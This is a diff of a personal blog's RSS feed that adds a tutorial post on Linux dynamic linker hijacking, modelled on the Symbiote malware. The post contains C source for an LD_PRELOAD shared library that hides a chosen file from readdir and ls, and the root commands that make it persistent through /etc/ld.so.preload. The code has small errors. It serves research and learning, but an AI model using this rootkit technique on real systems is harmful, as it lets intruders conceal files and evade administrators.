@@ -1,4 +1,133 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on archive://syrull</title><link>https://syrull.github.io/posts/</link><description>archive://syrull (Posts)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 23 Aug 2022 21:44:47 +0300</lastBuildDate><atom:link href="https://syrull.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>LegionTD2 Go SDK (v0.2.0)</title><link>https://syrull.github.io/posts/legiontd2-sdk/</link><pubDate>Tue, 23 Aug 2022 21:44:47 +0300</pubDate><guid>https://syrull.github.io/posts/legiontd2-sdk/</guid><description>&lt;p>&lt;img src="https://syrull.github.io/legiontdsdk/header.png" alt="LegionTD2">&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on archive://syrull</title><link>https://syrull.github.io/posts/</link><description>archive://syrull (Posts)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 02 Oct 2022 21:45:03 +0300</lastBuildDate><atom:link href="https://syrull.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</title><link>https://syrull.github.io/posts/dynamic-linker-hijacking-experiments/</link><pubDate>Sun, 02 Oct 2022 21:45:03 +0300</pubDate><guid>https://syrull.github.io/posts/dynamic-linker-hijacking-experiments/</guid><description>&lt;h1 id="overview" >Overview
+&lt;span>
+&lt;a href="#overview">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Recently I heard about a new malware called &lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat">Symbiote&lt;/a>, which the researches are calling the &amp;ldquo;Nearly-Impossible-to-Detect Linux Threat&amp;rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&amp;rsquo;ve started to research it.&lt;/p>
+&lt;p>I highly advice you to read through these articles first before we begin with the actual post:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://attack.mitre.org/techniques/T1574/006/">Hijack Execution Flow: Dynamic Linker Hijacking&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/ld_preload-trick-what-is">What Is the LD_PRELOAD?&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">What is a Shared Library?&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h1 id="implementation" >Implementation
+&lt;span>
+&lt;a href="#implementation">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>I decided to implement a very simple alternative of this malware just as a proof of concept since it was really interesting me. My idea is to create a file that will be hidden in the system.&lt;/p>
+&lt;p>First, if you already read the articles that I&amp;rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.&lt;/p>
+&lt;p>What do we need first and how to hide a file from lets say a command like &lt;code>ls&lt;/code>? With a little bit of investigating of how the &lt;code>ls&lt;/code> works internally through the &lt;a href="https://github.com/coreutils/coreutils/blob/master/src/ls.c">source code&lt;/a> and the &lt;a href="https://man7.org/linux/man-pages/man1/ls.1.html">linux manual page&lt;/a>
+We can see that internally we have a function that is called &lt;code>print_dir&lt;/code>. I&amp;rsquo;ve truncated the comments of the original source code.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print_dir (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>realname, &lt;span style="color:#66d9ef">bool&lt;/span> command_line_arg)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we continue further down the function we can see the loop that actually iterates over the files&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (true)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> next &lt;span style="color:#f92672">=&lt;/span> readdir (dirp); &lt;span style="color:#75715e">// Here we can see that the loop iterates over readdir as long
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// as the pointer that readdir returns isn&amp;#39;t null and the errno != 0
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (next)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> file_ignored (next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name)) &lt;span style="color:#75715e">// we can see here that it the filename is
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// taken from the next variable, lets look through the source code of `readdir`
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s confirm that by invoking &lt;code>nm&lt;/code> this will show us the dynamic symbols that are being loaded from shared libs.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ nm -D /usr/bin/ls | grep &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> U readdir@GLIBC_2.2.5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now I concluded that I need to search into the source code of &lt;code>readdir&lt;/code> which is located &lt;a href="https://github.com/torvalds/linux/blob/master/fs/readdir.c">here&lt;/a> and the &lt;a href="https://man7.org/linux/man-pages/man3/readdir.3.html">linux manual page&lt;/a>. The description more or less describes exactly what we concluded from the source code of &lt;code>ls.c&lt;/code>. Lets see where we set that &lt;code>d_name&lt;/code> variable.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dirent.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp); &lt;span style="color:#75715e">// Signature of the dirent
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ino_t d_ino; &lt;span style="color:#75715e">/* Inode number */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> off_t d_off; &lt;span style="color:#75715e">/* Not an offset; see below */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">short&lt;/span> d_reclen; &lt;span style="color:#75715e">/* Length of this record */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> d_type; &lt;span style="color:#75715e">/* Type of file; not supported
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> by all filesystem types */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> d_name[&lt;span style="color:#ae81ff">256&lt;/span>]; &lt;span style="color:#75715e">/* Null-terminated filename */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
+&lt;p>⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the &lt;code>dirent&lt;/code> structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that &lt;code>d_name&lt;/code> will exists since this field must be implemented on all POSIX systems.&lt;/p>
+&lt;/blockquote>
+&lt;p>Alright, let&amp;rsquo;s start implementing our own function &lt;code>readdir&lt;/code> that we will wrap the original one with.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* libhidemyfile.c */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dirent.h&amp;gt; // Including the Directory Entry structure&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">// The dynamic linking header file so we can use the dlsym
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// which will give us the address for the readdir symbol
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt; // So we can use the &lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(handle)(DIR &lt;span style="color:#f92672">*&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// https://man7.org/linux/man-pages/man3/dlsym.3.html
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Search for RTLD_NEXT, basically it allow us to wrap
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the original function
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> handle &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>dp;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Iterating over the return values of our original `readdir`
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span>((dp &lt;span style="color:#f92672">=&lt;/span> handle(dirp))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&amp;gt;d_name`)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// break the loop and go to the next entry, essentially skipping our file.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(strstr(dp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, &lt;span style="color:#e6db74">&amp;#34;syl.lys&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> dp;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is what our final version of wrapper for &lt;code>readdir&lt;/code> would look like. Now let&amp;rsquo;s try to compile it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flags:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://stackoverflow.com/questions/5311515/gcc-fpic-option">fPIC&lt;/a>&lt;/li>
+&lt;li>&lt;code>-shared&lt;/code> creates a shared object&lt;/li>
+&lt;li>&lt;a href="https://stackoverflow.com/questions/8836707/explanation-of-d-gnu-source-why-to-use-it-and-when">-D_GNU_SOURCE flag / _GNU_SOURCE&lt;/a> - TLDR: We need it for &lt;code>RTLD_NEXT&lt;/code>&lt;/li>
+&lt;li>&lt;a href="https://ubuntuforums.org/archive/index.php/t-1054717.html">-ldl&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>Now that we have shared object (*.so) file lets see how to use it in action.&lt;/p>
+&lt;h1 id="how-to-overwrite-the-exported-symbols-ld_preload" >How to overwrite the exported symbols? &lt;code>LD_PRELOAD&lt;/code>
+&lt;span>
+&lt;a href="#how-to-overwrite-the-exported-symbols-ld_preload">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;ul>
+&lt;li>&lt;a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">What is LD_PRELOAD?&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>I advice you to read that first to get a better understanding of how it works.&lt;/p>
+&lt;p>The next thing that we are going to do is to test our shared library and see if it works. Lets run &lt;code>ls&lt;/code> with our &lt;code>libhidemyfile.so&lt;/code> loaded before anything else.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ ls
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libhidemyfile.so syl.lys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>./libhidemyfile.so ls
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libhidemyfile.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you can see we successfully implement a shared library that hides our file from &lt;code>ls&lt;/code>, and not only that command, every command that uses &lt;code>readdir&lt;/code> won&amp;rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing &lt;code>LD_PRELOAD&lt;/code> in front of every command.&lt;/p>
+&lt;h2 id="etcldsopreload" >/etc/ld.so.preload
+&lt;span>
+&lt;a href="#etcldsopreload">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>If you read carefully the man pages for &lt;code>LD_PRELOAD&lt;/code> you should know that you won&amp;rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.&lt;/p>
+&lt;p>Instead we are going to use the &lt;code>/etc/ld.so.preload&lt;/code> which does not suffer from that restrictions. This suffers from requiring root privileges but c&amp;rsquo;mon.. if you are here you will get those!&lt;/p>
+&lt;p>We first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we just need to place our library dir in &lt;code>ld.so.preload&lt;/code> file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ sudo echo &lt;span style="color:#e6db74">&amp;#34;libhidemyfile.so&amp;#34;&lt;/span> &amp;gt; /etc/ld.so.preload
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And if everything is good, executing &lt;code>ls&lt;/code> or any of its aliases will hide our file from the output.&lt;/p>
+&lt;h1 id="end" >End
+&lt;span>
+&lt;a href="#end">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>If you reached here, thank you so much for the read. In the next part I will try to &amp;ldquo;completely&amp;rdquo; hide it from the system because now if we &lt;code>cat&lt;/code> it despite not &amp;ldquo;reading&amp;rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.&lt;/p></description></item><item><title>LegionTD2 Go SDK (v0.2.0)</title><link>https://syrull.github.io/posts/legiontd2-sdk/</link><pubDate>Tue, 23 Aug 2022 21:44:47 +0300</pubDate><guid>https://syrull.github.io/posts/legiontd2-sdk/</guid><description>&lt;p>&lt;img src="https://syrull.github.io/legiontdsdk/header.png" alt="LegionTD2">&lt;/p>
 &lt;p>Recently I&amp;rsquo;ve been fascinated with a game called &lt;a href="https://beta.legiontd2.com/">LegionTD2&lt;/a>, this is a newly created game that I&amp;rsquo;ve been playing
 as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it &lt;a href="https://store.steampowered.com/app/469600/Legion_TD_2__Multiplayer_Tower_Defense/">here&lt;/a>.&lt;/p>
 &lt;h1 id="legiontd-sdk" >LegionTD SDK
